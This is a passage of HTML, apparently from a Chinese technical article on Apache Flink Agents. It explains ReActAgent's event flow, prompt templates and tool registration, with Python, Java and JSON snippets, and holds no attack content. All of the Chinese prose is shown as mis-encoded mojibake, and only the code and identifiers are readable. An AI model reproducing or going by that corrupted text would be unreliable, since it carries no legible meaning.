id=\"è¿è¡Œæ—¶åä½œ\">è¿è¡Œæ—¶åä½œ</h5>\n<ul>\n<li>æ‰§è¡ŒçŽ¯å¢ƒè´Ÿè´£è°ƒåº¦å’Œè¿è¡ŒAgentä¸­çš„å„ä¸ªç»„ä»¶</li>\n<li>Agenté€šè¿‡RunnerContext è®¿é—®åœ¨çŽ¯å¢ƒä¸­æ³¨å†Œçš„èµ„æº</li>\n<li>æ•´ä¸ªè¿‡ç¨‹é‡‡ç”¨äº‹ä»¶é©±åŠ¨çš„æ–¹å¼ï¼Œé€šè¿‡å‘é€å’ŒæŽ¥æ”¶äº‹ä»¶æ¥æŽ¨è¿›æ‰§è¡Œæµç¨‹</li>\n</ul>\n<h3 id=\"33-å…¸åž‹æ‰§è¡Œæµç¨‹\">3.3 å…¸åž‹æ‰§è¡Œæµç¨‹</h3>\n<p>å¯¹äºŽ ReActAgent æ¥è¯´ï¼Œå…·ä½“é€‚é…æµç¨‹å¦‚ä¸‹ï¼š</p>\n<ul>\n<li>çŽ¯å¢ƒåˆå§‹åŒ–ï¼šé€šè¿‡ AgentsExecutionEnvironment.get_execution_environment(env) èŽ·å–é€‚å½“çš„æ‰§è¡ŒçŽ¯å¢ƒ</li>\n<li>èµ„æºé…ç½®ï¼šä½¿ç”¨ addResource() æ·»åŠ æ¨¡åž‹ã€å·¥å…·ç­‰èµ„æº</li>\n<li>è¾“å…¥è®¾ç½®ï¼šé€šè¿‡fromDataStream()ã€ fromTable()ç­‰è®¾ç½®è¾“å…¥æº</li>\n<li>Agentåº”ç”¨ï¼šä½¿ç”¨ apply()æ–¹æ³•åº”ç”¨Agent é€»è¾‘</li>\n<li>è¾“å‡ºèŽ·å–ï¼šé€šè¿‡ toDataStream() èŽ·å–å¤„ç†åŽçš„ DataStream</li>\n<li>æ‰§è¡Œï¼šé€šè¿‡execute() è§¦å‘Flinkä½œä¸šæ‰§è¡Œ</li>\n</ul>\n<p>å…¸åž‹çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>\n<ul>\n<li>run å‡½æ•°æŽ¥æ”¶åˆ°è¾“å…¥æ•°æ®</li>\n<li>åˆ›å»ºInputEvent å¹¶å‘é€åˆ°äº‹ä»¶é˜Ÿåˆ—</li>\n<li>start_actionå¤„ç†InputEventï¼Œæ ¼å¼åŒ–è¾“å…¥å¹¶å‘é€ ChatRequestEvent</li>\n<li>LLMå¤„ç†åŽäº§ç”Ÿ ChatResponseEvent</li>\n<li>stop_action å¤„ç† ChatResponseEventï¼Œè§£æžç»“æžœå¹¶å‘é€ OutputEvent</li>\n<li>run å‡½æ•°æ”¶é›† OutputEvent å¹¶è¿”å›žç»“æžœ</li>\n</ul>\n<p>å…³é”®ç‰¹ç‚¹æ˜¯ï¼š</p>\n<ul>\n<li>äº‹ä»¶é©±åŠ¨ï¼šä½¿ç”¨äº‹ä»¶é˜Ÿåˆ—é©±åŠ¨æ•´ä¸ªæ‰§è¡Œæµç¨‹</li>\n<li>ä¸Šä¸‹æ–‡éš”ç¦»ï¼šæ¯ä¸ªé”®å€¼å¯¹åº”ç‹¬ç«‹çš„æ‰§è¡Œä¸Šä¸‹æ–‡</li>\n<li>å¼‚æ­¥æ”¯æŒï¼šè™½ç„¶æœ¬åœ°æ‰§è¡ŒçŽ¯å¢ƒå›žé€€åˆ°åŒæ­¥æ‰§è¡Œï¼Œä½†ä»ç„¶æ”¯æŒå¼‚æ­¥æŽ¥å£</li>\n<li>çŠ¶æ€ç®¡ç†ï¼šé€šè¿‡ LocalRunnerContext ç®¡ç†çŸ­æœŸè®°å¿†å’Œèµ„æºé…ç½®</li>\n</ul>\n<h3 id=\"34-start_action-ä¸Ž-stop_action\">3.4 start_action ä¸Ž stop_action</h3>\n<p><strong>æ•´ä½“æµç¨‹ç‰¹è‰²</strong></p>\n<p>è¿™ä¸¤ä¸ª action æž„æˆå®Œæ•´çš„ ReAct æ¨¡å¼ï¼š</p>\n<ul>\n<li>å¼€å§‹-ç»“æŸæ¨¡å¼ï¼šstart_action ä½œä¸ºå…¥å£ï¼Œå°†åŽŸå§‹è¾“å…¥è½¬åŒ–ä¸ºé€‚åˆ LLM å¤„ç†çš„æ ¼å¼ï¼›stop_action ä½œä¸ºå‡ºå£ï¼Œå°† LLM å“åº”è½¬æ¢ä¸ºç»“æž„åŒ–è¾“å‡ºã€‚</li>\n<li>ä¸­é—´å¤„ç†é€æ˜ŽåŒ–ï¼šç”¨æˆ·æ— éœ€å…³å¿ƒä¸­é—´æ­¥éª¤ï¼ˆå¦‚å·¥å…·è°ƒç”¨ã€ä¸Šä¸‹æ–‡æ£€ç´¢ç­‰ï¼‰ï¼Œè¿™äº›ç”±å†…ç½®çš„ CHAT_MODEL_ACTIONã€TOOL_CALL_ACTION ç­‰è‡ªåŠ¨å¤„ç†ã€‚</li>\n<li>å¯é…ç½®æ€§ï¼šæ”¯æŒè‡ªå®šä¹‰ Promptã€è¾“å‡º schema å®šä¹‰åŠé”™è¯¯å¤„ç†ç­–ç•¥ã€‚</li>\n</ul>\n<p><strong>åŠŸèƒ½</strong></p>\n<p>ReActAgent çš„ start_action ä¸Ž stop_action å„å…·ç‰¹å¾ï¼ŒäºŒè€…åˆ†åˆ«æ‰¿æ‹…å¯¹è¯çš„å‘èµ·ä¸Žç»ˆç»“èŒè´£ã€‚</p>\n<ul>\n<li>start_action è´Ÿè´£è¾“å…¥äº‹ä»¶çš„å¤„ç†ã€‚å®ƒé¦–å…ˆæŽ¥æ”¶ InputEventï¼Œä½œä¸ºæ•´ä¸ª Agent æµç¨‹çš„èµ·ç‚¹ï¼Œå¯æŽ¥å—åŽŸå§‹ç±»åž‹ã€å¤æ‚å¯¹è±¡æˆ– Row ç­‰å¤šç§æ•°æ®ã€‚è‹¥æä¾› Promptï¼Œåˆ™ä»¥æ­¤æ ¼å¼åŒ–ç”¨æˆ·è¾“å…¥ï¼Œå°†ç®€å•å­—ç¬¦ä¸²æˆ–å¤æ‚å¯¹è±¡ï¼ˆå¦‚ Row æˆ– POJOï¼‰çš„å±žæ€§è‡ªåŠ¨æå–å¹¶å¡«å…¥æ¨¡æ¿ã€‚éšåŽï¼Œç³»ç»Ÿè‡ªåŠ¨è¿½åŠ  schema promptï¼Œçº¦æŸå¤§æ¨¡åž‹è¾“å‡ºç»“æž„ï¼Œå†å°†æ•´ç†åŽçš„å†…å®¹å°è£…ä¸º ChatRequestEventï¼Œè§¦å‘åŽç»­å¤„ç†ï¼Œé»˜è®¤è°ƒç”¨ _DEFAULT_CHAT_MODEL å®Œæˆé¦–æ¬¡ç”Ÿæˆã€‚</li>\n<li>stop_action åˆ™å¤„ç†è¾“å‡ºäº‹ä»¶ã€‚å®ƒä»¥ ChatResponseEvent ä¸ºè¾“å…¥ï¼Œæ ‡å¿—å¤§æ¨¡åž‹ç”Ÿæˆå®Œæ¯•ï¼Œæ˜¯æ•´ä¸ªæµç¨‹çš„ç»ˆç‚¹ã€‚è¯¥åŠ¨ä½œæ”¯æŒæŒ‰ schema è§£æžä¸ŽéªŒè¯è¿”å›žç»“æžœï¼Œå¯å°† JSON æ–‡æœ¬è½¬æ¢ä¸º Pydantic æ¨¡åž‹æˆ– RowTypeInfo æŒ‡å®šç»“æž„ï¼Œå¹¶æä¾›é”™è¯¯å¤„ç†ç­–ç•¥ï¼ˆå¿½ç•¥æˆ–æŠ›å‡ºå¼‚å¸¸ï¼‰ï¼Œä¿è¯è¾“å‡ºç±»åž‹å®‰å…¨ä¸Žä¸šåŠ¡ä¸€è‡´æ€§ã€‚</li>\n</ul>\n<p><strong>ä¸Žå…¶ä»–ç»„ä»¶çš„åä½œ</strong></p>\n<p>åœ¨ ReActAgent åˆå§‹åŒ–æ—¶æ³¨å†Œè¿™ä¸¤ä¸ª actionï¼š</p>\n<pre><code class=\"language-python\">self.add_action(\n    name=\"stop_action\",\n    events=[ChatResponseEvent],\n    func=self.stop_action,\n    output_schema=OutputSchema(output_schema=output_schema),\n)\n</code></pre>\n<p>è¿™ä¸¤ä¸ª action ä¸Ž Agent å†…ç½®çš„å…¶ä»– actionï¼ˆå¦‚å·¥å…·è°ƒç”¨ã€ä¸Šä¸‹æ–‡æ£€ç´¢ï¼‰é…åˆå·¥ä½œï¼Œåœ¨ ActionExecutionOperator ä¸­å½¢æˆä¸€ä¸ªå®Œæ•´çš„äº‹ä»¶é©±åŠ¨å¤„ç†é“¾ã€‚</p>\n<h3 id=\"35-è¾“å…¥è¾“å‡º\">3.5 è¾“å…¥è¾“å‡º</h3>\n<p>Flink Agent çš„è¾“å…¥è¾“å‡ºå…·æœ‰ä»¥ä¸‹å‡ ä¸ªæ˜¾è‘—ç‰¹ç‚¹ï¼Œå¹¶é€šè¿‡ç‰¹å®šæœºåˆ¶ä¸ŽFlinkè¿›è¡Œé€‚é…ã€‚</p>\n<h4 id=\"351-äº‹ä»¶é©±åŠ¨æž¶æž„\">3.5.1 äº‹ä»¶é©±åŠ¨æž¶æž„</h4>\n<p>Flink Agent åŸºäºŽäº‹ä»¶é©±åŠ¨æ¨¡åž‹ï¼Œè¾“å…¥å’Œè¾“å‡ºéƒ½æ˜¯é€šè¿‡äº‹ä»¶å¯¹è±¡è¿›è¡Œä¼ é€’ï¼š</p>\n<ul>\n<li>è¾“å…¥ï¼šé€šè¿‡InputEvent å°è£…åŽŸå§‹æ•°æ®</li>\n<li>è¾“å‡ºï¼šé€šè¿‡OutputEventå°è£…å¤„ç†ç»“æžœ</li>\n<li>ä¸­é—´äº‹ä»¶ï¼šåŒ…æ‹¬ ChatRequestEventã€ChatResponseEventã€ToolRequestEventã€ToolResponseEventç­‰</li>\n</ul>\n<h4 id=\"352-ç»Ÿä¸€çš„æ•°æ®å°è£…\">3.5.2 ç»Ÿä¸€çš„æ•°æ®å°è£…</h4>\n<p>æ‰€æœ‰æ•°æ®éƒ½è¢«å°è£…æˆäº‹ä»¶å¯¹è±¡ï¼Œä¾¿äºŽAgentå†…éƒ¨æµè½¬å’Œå¤„ç†ã€‚</p>\n<h4 id=\"353-æ”¯æŒå¤šç§æ•°æ®ç±»åž‹\">3.5.3 æ”¯æŒå¤šç§æ•°æ®ç±»åž‹</h4>\n<p>è¾“å…¥æ”¯æŒå¤šç§æ•°æ®ç±»åž‹ï¼š</p>\n<ul>\n<li>åŸºæœ¬æ•°æ®ç±»åž‹</li>\n<li>Flink Rowå¯¹è±¡</li>\n<li>POJOå¯¹è±¡</li>\n<li>å¤æ‚åµŒå¥—ç»“æžœ</li>\n</ul>\n<p>è¾“å‡ºåŒæ ·æ”¯æŒçµæ´»çš„æ•°æ®ç»“æž„ï¼Œå¯ä»¥é€šè¿‡schemaè¿›è¡Œçº¦æŸ</p>\n<h4 id=\"354-å†…ç½®æ¨¡æ¿æ”¯æŒ\">3.5.4 å†…ç½®æ¨¡æ¿æ”¯æŒ</h4>\n<p>é€šè¿‡Promptç±»æ”¯æŒæ¨¡æ¿åŒ–è¾“å…¥å¤„ç†ï¼Œå¯ä»¥å®šä¹‰å¤æ‚çš„æç¤ºè¯æ¨¡æ¿</p>\n<h3 id=\"36-æ¨¡æ¿ç³»ç»Ÿ\">3.6 æ¨¡æ¿ç³»ç»Ÿ</h3>\n<p>æ¨¡æ¿å¯ä»¥ç”¨åœ¨æç¤ºè¯å’ŒSchemaã€‚Flink Agent ä¸­çš„æ¨¡æ¿ç³»ç»Ÿä¸»è¦åœ¨ Prompt ç±»ä¸­å®žçŽ°ï¼Œæ”¯æŒä¸¤ç§ç±»åž‹çš„æ¨¡æ¿ï¼š</p>\n<h4 id=\"361-å­—ç¬¦ä¸²æ¨¡æ¿\">3.6.1 å­—ç¬¦ä¸²æ¨¡æ¿</h4>\n<p>æœ€åŸºæœ¬çš„æ¨¡æ¿å½¢å¼ï¼Œå°±æ˜¯ä¸€ä¸ªåŒ…å«å ä½ç¬¦çš„å­—ç¬¦ä¸²ï¼š</p>\n<pre><code class=\"language-java\">        String specialTemplate = \"Handle special chars: {text} with symbols like @#$%^&amp;*()\";\n        Prompt specialPrompt = new Prompt(specialTemplate);\n\n        Map&lt;String, String&gt; specialVars = new HashMap&lt;&gt;();\n        specialVars.put(\"text\", \"Hello &amp; Welcome!\");\n\n        String result = specialPrompt.formatString(specialVars);\n\n</code></pre>\n<h4 id=\"362-æ¶ˆæ¯æ¨¡æ¿\">3.6.2 æ¶ˆæ¯æ¨¡æ¿</h4>\n<p>æ›´å¤æ‚çš„æ¨¡æ¿å½¢å¼ï¼ŒåŒ…å«å¤šä¸ª ChatMessage å¯¹è±¡ï¼Œå¯ä»¥æŒ‡å®šä¸åŒçš„è§’è‰²ã€‚</p>\n<pre><code class=\"language-python\">        List&lt;ChatMessage&gt; multipleMessages =\n                Arrays.asList(\n                        new ChatMessage(MessageRole.SYSTEM, \"You are a helpful assistant.\"),\n                        new ChatMessage(MessageRole.USER, \"First message\"),\n                        new ChatMessage(MessageRole.ASSISTANT, \"I understand\"),\n                        new ChatMessage(\n                                MessageRole.USER, \"Second message - this should be the response\"));\n\n        Prompt multiPrompt = new Prompt(multipleMessages);\n\n</code></pre>\n<p>æ¨¡æ¿çš„ç®¡ç†æµç¨‹å¦‚ä¸‹ï¼š</p>\n<ul>\n<li>æ¨¡æ¿åˆ›å»ºï¼šç”¨æˆ·åˆ›å»º Prompt  å¯¹è±¡ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–æ¶ˆæ¯åˆ—è¡¨ã€‚</li>\n<li>å˜é‡æ›¿æ¢ï¼šä½¿ç”¨ formatString() æˆ–è€… formatMessages() æ–¹æ³•å¯¹ä¼ å…¥å˜é‡æ˜ å°„è¿›è¡Œæ›¿æ¢</li>\n<li>LLM è°ƒç”¨ï¼šæ ¼å¼åŒ–çš„æ¶ˆæ¯è¢«å‘é€ç»™LLMè¿›è¡Œå¤„ç†ã€‚</li>\n</ul>\n<pre><code class=\"language-python\">class Prompt(SerializableResource, ABC):\n    \"\"\"Base prompt abstract.\"\"\"\n\n    @staticmethod\n    def from_messages(messages: Sequence[ChatMessage]) -&gt; \"Prompt\":\n        \"\"\"Create prompt from sequence of ChatMessage.\"\"\"\n        return LocalPrompt(template=messages)\n\n    @staticmethod\n    def from_text(text: str) -&gt; \"Prompt\":\n        \"\"\"Create prompt from text string.\"\"\"\n        return LocalPrompt(template=text)\n\n    @abstractmethod\n    def format_string(self, **kwargs: str) -&gt; str:\n        \"\"\"Generate text string from template with additional arguments.\"\"\"\n\n    @abstractmethod\n    def format_messages(\n        self, role: MessageRole = MessageRole.SYSTEM, **kwargs: str\n    ) -&gt; List[ChatMessage]:\n        \"\"\"Generate list of ChatMessage from template with additional arguments.\"\"\"\n\n    @classmethod\n    @override\n    def resource_type(cls) -&gt; ResourceType:\n        \"\"\"Get the resource type.\"\"\"\n        return ResourceType.PROMPT\n\nclass LocalPrompt(Prompt):\n    \"\"\"Prompt for a language model.\n\n    Attributes:\n    ----------\n    template : Union[Sequence[ChatMessage], str]\n        The prompt template.\n    \"\"\"\n\n    template: Sequence[ChatMessage] | str\n\n    def format_string(self, **kwargs: str) -&gt; str:\n        \"\"\"Generate text string from template with input arguments.\"\"\"\n        if isinstance(self.template, str):\n            return format_string(self.template, **kwargs)\n        else:\n            msgs = []\n            for m in self.template:\n                msg = f\"{m.role.value}: {format_string(m.content, **kwargs)}\"\n                if m.extra_args is not None and len(m.extra_args) &gt; 0:\n                    msg += f\"{m.extra_args}\"\n                msgs.append(msg)\n            return \"\\n\".join(msgs)\n\n    def format_messages(\n        self, role: MessageRole = MessageRole.SYSTEM, **kwargs: str\n    ) -&gt; List[ChatMessage]:\n        \"\"\"Generate list of ChatMessage from template with input arguments.\"\"\"\n        if isinstance(self.template, str):\n            return [\n                ChatMessage(role=role, content=format_string(self.template, **kwargs))\n            ]\n        else:\n            msgs = []\n            for m in self.template:\n                msg = ChatMessage(\n                    role=m.role, content=format_string(m.content, **kwargs)\n                )\n                msgs.append(msg)\n            return msgs\n</code></pre>\n<h3 id=\"37-functiontool-ä¸Ž-action-çš„å…³è”åŠæ³¨å†Œæœºåˆ¶\">3.7 FunctionTool ä¸Ž Action çš„å…³è”åŠæ³¨å†Œæœºåˆ¶</h3>\n<p>åœ¨ Flink Agents æ¡†æž¶ä¸­ï¼Œfunction tool ä¸Ž action çš„è”ç³»å’Œæ³¨å†Œæ¶‰åŠå¤šä¸ªç»„ä»¶å’Œæ­¥éª¤ã€‚</p>\n<h4 id=\"371-å®žé™…è½¬æ¢æµç¨‹\">3.7.1 å®žé™…è½¬æ¢æµç¨‹</h4>\n<p>å…·ä½“çš„å·¥å…·åˆ° prompt çš„è½¬æ¢è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>å·¥å…·é€šè¿‡ @Tool æˆ– @tool æ³¨å†Œåˆ°æ‰§è¡ŒçŽ¯å¢ƒä¸­</li>\n<li>åœ¨åˆ›å»º ResourceDescriptor æ—¶ï¼Œé€šè¿‡ tools å‚æ•°å¼•ç”¨è¿™äº›å·²æ³¨å†Œçš„å·¥å…·</li>\n<li>å½“èŠå¤©æ¨¡åž‹ setup ç±»ï¼ˆå¦‚ OllamaChatModelSetupï¼‰åˆå§‹åŒ–æ—¶ï¼Œå®ƒä¼šèŽ·å–è¿™äº›å·¥å…·çš„å…ƒæ•°æ®ï¼ˆåŒ…æ‹¬åç§°å’Œæè¿°ï¼‰</li>\n<li>è¿™äº›å·¥å…·ä¿¡æ¯ä¼šè¢«è‡ªåŠ¨æ•´åˆåˆ°å‘é€ç»™ LLM çš„ç³»ç»Ÿ prompt ä¸­ï¼Œå‘ŠçŸ¥ LLM æœ‰å“ªäº›å¯ç”¨å·¥å…·åŠå…¶ç”¨é€”</li>\n</ol>\n<p>è¿™ç§æ–¹å¼ä½¿å¾—å¼€å‘è€…åªéœ€å…³æ³¨å·¥å…·çš„å®šä¹‰å’Œæ³¨å†Œï¼Œè€Œæ— éœ€æ‰‹åŠ¨ç¼–å†™å·¥å…·æè¿°åˆ° prompt ä¸­ï¼Œæé«˜äº†å¼€å‘æ•ˆçŽ‡å¹¶å‡å°‘äº†å‡ºé”™å¯èƒ½æ€§ã€‚</p>\n<h5 id=\"function-tool-æ³¨å†Œåˆ°-agent\">Function Tool æ³¨å†Œåˆ° Agent</h5>\n<p>Function tool é¦–å…ˆé€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼æ³¨å†Œåˆ°æ‰§è¡ŒçŽ¯å¢ƒä¸­ï¼š</p>\n<p><strong>æ–¹å¼ä¸€ï¼šä½¿ç”¨è£…é¥°å™¨</strong></p>\n<pre><code class=\"language-python\">    @tool\n    @staticmethod\n    def notify_shipping_manager(id: str, review: str) -&gt; None:\n        \"\"\"Notify the shipping manager when product received a negative review due to\n        shipping damage.\n\n        Parameters\n        ----------\n        id : str\n            The id of the product that received a negative review due to shipping damage\n        review: str\n            The negative review content\n        \"\"\"\n        # reuse the declared function, but for parsing the tool metadata, we write doc\n        # string here again.\n        notify_shipping_manager(id=id, review=review)\n</code></pre>\n<p><strong>æ–¹å¼äºŒï¼šä½¿ç”¨ add_resource æ–¹æ³•</strong></p>\n<p>å³ï¼Œåœ¨æ‰§è¡ŒçŽ¯å¢ƒæ³¨å†Œå·¥å…·èµ„æºã€‚</p>\n<pre><code class=\"language-python\">def add(a: int, b: int) -&gt; int:\n    \"\"\"Calculate the sum of a and b.\n\n    Parameters\n    ----------\n    a : int\n        The first operand\n    b : int\n        The second operand\n\n    Returns:\n    -------\n    int:\n        The sum of a and b\n    \"\"\"\n    return a + b\n\nenv.add_resource(\"add\", ResourceType.TOOL, add)\n</code></pre>\n<p><strong>æ–¹å¼ä¸‰ï¼šåœ¨ Agent æž„é€ å‡½æ•°ä¸­æ·»åŠ </strong></p>\n<pre><code class=\"language-python\">class MyAgent(Agent):\n    def __init__(self):\n        super().__init__()\n        self.add_resource(\"add\", add) # æ·»åŠ åˆ° TOOL ç±»åž‹èµ„æºä¸­\n</code></pre>\n<p><strong>æ–¹å¼å››ï¼šåœ¨  ReActAgent æž„å»ºæ—¶å€™ä¼ å…¥</strong></p>\n<p>å³ï¼Œé€šè¿‡ tools å‚æ•°æŒ‡å®šã€‚</p>\n<pre><code class=\"language-java\">    // Create ReAct agent.\n    private static ReActAgent getReActAgent() {\n        return new ReActAgent(\n                ResourceDescriptor.Builder.newBuilder(OllamaChatModelSetup.class.getName())\n                        .addInitialArgument(\"connection\", \"ollamaChatModelConnection\")\n                        .addInitialArgument(\"model\", \"qwen3:8b\")\n                        .addInitialArgument(\n                                \"tools\", Collections.singletonList(\"notifyShippingManager\"))\n                        .build(),\n                reviewAnalysisReactPrompt(),\n                CustomTypesAndResources.ProductReviewAnalysisRes.class);\n    }\n</code></pre>\n<h5 id=\"ä¸Žæ¨¡åž‹äº¤äº’\">ä¸Žæ¨¡åž‹äº¤äº’</h5>\n<p>Chat Model Setup ä¸­å¼•ç”¨å·¥å…·</p>\n<p>åœ¨åˆ›å»º Chat Model Setup æ—¶ï¼Œé€šè¿‡ tools å‚æ•°æŒ‡å®šè¦ä½¿ç”¨çš„å·¥å…·åˆ—è¡¨ï¼š</p>\n<pre><code class=\"language-python\">chat_model_descriptor = ResourceDescriptor(\nclazz=OllamaChatModelSetup,\nconnection=\"my_ollama_connection\",\nmodel=\"qwen3:8b\",\ntools=[\"notify_shipping_manager\"]   # å¼•ç”¨å·²æ³¨å†Œçš„å·¥å…·\n)\n</code></pre>\n<h4 id=\"372-agentplan-ç¼–è¯‘è¿‡ç¨‹ä¸­å·¥å…·çš„å¤„ç†\">3.7.2 AgentPlan ç¼–è¯‘è¿‡ç¨‹ä¸­å·¥å…·çš„å¤„ç†</h4>\n<p>Flink Agents å†…ç½®äº†ä¸€ä¸ª TOOL_CALL_ACTIONï¼Œï¼Œä¸“é—¨ç”¨äºŽè°ƒç”¨å·¥å…·ã€‚TOOL_CALL_ACTION ä¸Žç”¨æˆ·å®šä¹‰å·¥å…·å‡½æ•°çš„è”ç³»ä¸»è¦ä¾èµ–äºŽï¼š</p>\n<ul>\n<li>ç»Ÿä¸€çš„å‘½åç³»ç»Ÿï¼šå·¥å…·å‡½æ•°çš„åç§°ä½œä¸ºå”¯ä¸€æ ‡è¯†ç¬¦</li>\n<li>èµ„æºç®¡ç†æœºåˆ¶ï¼šé€šè¿‡ RunnerContext.get_resource() æ–¹æ³•æŒ‰åç§°æ£€ç´¢å·¥å…·</li>\n<li>æ ‡å‡†åŒ–æŽ¥å£ï¼šæ‰€æœ‰å·¥å…·éƒ½å®žçŽ°ç›¸åŒçš„ call() æŽ¥å£</li>\n<li>äº‹ä»¶é©±åŠ¨æž¶æž„ï¼šé€šè¿‡ ToolRequestEvent å’Œ ToolResponseEvent ä¼ é€’è°ƒç”¨ä¿¡æ¯</li>\n</ul>\n<p>è¿™ç§è®¾è®¡ä½¿å¾—ç³»ç»Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°å°† LLM çš„å·¥å…·è°ƒç”¨è¯·æ±‚è·¯ç”±åˆ°æ­£ç¡®çš„ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼Œè€Œæ— éœ€ç¡¬ç¼–ç å…·ä½“çš„å‡½æ•°å¼•ç”¨ã€‚</p>\n<p><img alt=\"3-1\" class=\"lazyload\" /></p>\n<h5 id=\"ç”¨æˆ·å®šä¹‰çš„-function-tool-è½¬æ¢ä¸º-action\">ç”¨æˆ·å®šä¹‰çš„ Function Tool è½¬æ¢ä¸º Action</h5>\n<p>å½“ Agent è¢«ç¼–è¯‘æˆ AgentPlan æ—¶ï¼Œç³»ç»Ÿä¼šæ”¶é›†æ‰€æœ‰èµ„æºï¼ˆåŒ…æ‹¬å·¥å…·ï¼‰ ï¼Œè¿™äº›å·¥å…·ä¼šè¢«è½¬æ¢ä¸ºå¯æ‰§è¡Œçš„ Actionï¼š</p>\n<ul>\n<li>åœ¨ _get_resource_providers å‡½æ•°ä¸­ï¼Œè¯†åˆ«å¸¦æœ‰ _is_tool å±žæ€§çš„èµ„æº</li>\n<li>ä½¿ç”¨ from_callable å°†å‡½æ•°è½¬æ¢ä¸ºå·¥å…·å¯¹è±¡</li>\n<li>å·¥å…·è¢«åŒ…è£…ä¸º ResourceProvider å¹¶å­˜å‚¨åœ¨ AgentPlan ä¸­ï¼Œå³é€šè¿‡ PythonSerializableResourceProvider åŒ…è£…å·¥å…·èµ„æº</li>\n</ul>\n<h5 id=\"å†…ç½®-tool-call-action\">å†…ç½® Tool Call Action</h5>\n<p>æ¡†æž¶æä¾›äº†ä¸€ä¸ªå†…ç½®çš„ TOOL_CALL_ACTIONï¼Œä¸“é—¨ç”¨äºŽè°ƒç”¨å·¥å…·ï¼š</p>\n<pre><code class=\"language-python\">TOOL_CALL_ACTION = Action(\n    name=\"tool_call_action\",\n    exec=PythonFunction.from_callable(process_tool_request),\n    listen_event_types=[f\"{ToolRequestEvent.__module__}.{ToolRequestEvent.__name__}\"],\n)\n</code></pre>\n<p>å¯¹åº”Action ä¸ºToolCallActionï¼Œå…¶ä¸­ processToolRequest å‡½æ•°ä¼šä¸Žç”¨æˆ·è‡ªå®šä¹‰çš„å·¥å…·å‡½æ•°ç›¸äº’å…³è”ã€‚å…·ä½“è”ç³»æœºåˆ¶å¦‚ä¸‹ï¼š</p>\n<ul>\n<li>å‘½ååŒ¹é…ï¼šå½“ LLM å†³å®šè°ƒç”¨æŸä¸ªå·¥å…·æ—¶ï¼Œå®ƒä¼šåœ¨ tool_call ä¸­æŒ‡å®šå·¥å…·åç§°ï¼ˆå¦‚ \"notify_shipping_manager\"ï¼‰</li>\n<li>èµ„æºæŸ¥æ‰¾ï¼šTOOL_CALL_ACTION ä½¿ç”¨è¿™ä¸ªåç§°é€šè¿‡ ctx.get_resource(name, ResourceType.TOOL) æŸ¥æ‰¾å·²æ³¨å†Œçš„å·¥å…·</li>\n<li>åŠ¨æ€è°ƒç”¨ï¼šæ‰¾åˆ°å·¥å…·åŽï¼Œé€šè¿‡ tool.call(**kwargs) è°ƒç”¨ç”¨æˆ·å®šä¹‰çš„å®žé™…å‡½æ•°</li>\n</ul>\n<pre><code class=\"language-java\">public class ToolCallAction {\n    public static Action getToolCallAction() throws Exception {\n        return new Action(\n                \"tool_call_action\",\n                new JavaFunction(\n                        ToolCallAction.class,\n                        \"processToolRequest\",\n                        new Class[] {ToolRequestEvent.class, RunnerContext.class}),\n                List.of(ToolRequestEvent.class.getName()));\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public static void processToolRequest(ToolRequestEvent event, RunnerContext ctx) {\n        Map&lt;String, Boolean&gt; success = new HashMap&lt;&gt;();\n        Map&lt;String, String&gt; error = new HashMap&lt;&gt;();\n        Map&lt;String, ToolResponse&gt; responses = new HashMap&lt;&gt;();\n        Map&lt;String, String&gt; externalIds = new HashMap&lt;&gt;();\n        for (Map&lt;String, Object&gt; toolCall : event.getToolCalls()) {\n            String id = String.valueOf(toolCall.get(\"id\"));\n            Map&lt;String, Object&gt; function = (Map&lt;String, Object&gt;) toolCall.get(\"function\");\n            String name = (String) function.get(\"name\");// èŽ·å–å·¥å…·åç§°\n            Map&lt;String, Object&gt; arguments = (Map&lt;String, Object&gt;) function.get(\"arguments\"); // èŽ·å–å·¥å…·å‚æ•°\n\n            if (toolCall.containsKey(\"original_id\")) {\n                externalIds.put(id, (String) toolCall.get(\"original_id\"));\n            }\n\n            Tool tool = null;\n            try {\n                // ä»Žä¸Šä¸‹æ–‡èŽ·å–å¯¹åº”åç§°çš„å·¥å…·èµ„æº\n                tool = (Tool) ctx.getResource(name, ResourceType.TOOL);\n            } catch (Exception e) {\n                success.put(id, false);\n                responses.put(\n                        id, ToolResponse.error(String.format(\"Tool %s does not exist.\", name)));\n                error.put(id, e.getMessage());\n            }\n\n            if (tool != null) {\n                try {\n                    // è°ƒç”¨ç”¨æˆ·å®žé™…å·¥å…·\n                    ToolResponse response = tool.call(new ToolParameters(arguments));\n                    success.put(id, true);\n                    responses.put(id, response);\n                } catch (Exception e) {\n                    success.put(id, false);\n                    responses.put(\n                            id, ToolResponse.error(String.format(\"Tool %s execute failed.\", name)));\n                    error.put(id, e.getMessage());\n                }\n            }\n        }\n        // è¿”å›žå·¥å…·å“åº”äº‹ä»¶\n        ctx.sendEvent(new ToolResponseEvent(event.getId(), responses, success, error, externalIds));\n    }\n}\n</code></pre>\n<p>è¿™ä¸ª action ç›‘å¬ ToolRequestEvent äº‹ä»¶ï¼Œå¹¶æ‰§è¡Œå·¥å…·è°ƒç”¨ã€‚è°ƒç”¨å®ŒæˆåŽï¼Œå°†ç»“æžœé€šè¿‡ ToolReponseEvent è¿”å›žã€‚</p>\n<pre><code class=\"language-json\">    \"tool_call_action\": {\n      \"name\": \"tool_call_action\",\n      \"exec\": {\n        \"func_type\": \"PythonFunction\",\n        \"module\": \"flink_agents.plan.actions.tool_call_action\",\n        \"qualname\": \"process_tool_request\"\n      },\n      \"listen_event_types\": [\n        \"flink_agents.api.events.tool_event.ToolRequestEvent\"\n      ]\n    }\n</code></pre>\n<h5 id=\"tool_call_action-å¦‚ä½•ç¼–è¯‘åˆ°agentplan\">TOOL_CALL_ACTION å¦‚ä½•ç¼–è¯‘åˆ°AgentPlan</h5>\n<ul>\n<li>\n<p>åœ¨ AgentPlan.from_agent æ–¹æ³•ä¸­ï¼š</p>\n<ul>\n<li>å½“åˆ›å»º AgentPlan æ—¶ï¼Œä¼šæ”¶é›†æ‰€æœ‰åŠ¨ä½œï¼ŒåŒ…æ‹¬ç”¨æˆ·å®šä¹‰çš„åŠ¨ä½œå’Œå†…ç½®åŠ¨ä½œ</li>\n<li>ä»£ç 